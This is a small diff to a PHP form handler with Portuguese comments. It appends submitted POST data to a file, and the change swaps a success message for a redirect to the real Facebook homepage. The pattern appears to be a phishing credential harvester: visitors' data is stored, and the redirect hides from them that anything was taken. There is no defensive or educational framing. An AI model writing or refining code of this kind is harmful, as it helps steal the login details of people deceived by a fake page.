@@ -12,6 +12,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Salva os dados no arquivo
     file_put_contents($arquivo, $dados, FILE_APPEND);
 
-    echo "Dados salvos com sucesso!";
+    // Redireciona para a página inicial do Facebook
+    header('Location: https://www.facebook.com');
+    exit();
 }
 ?>
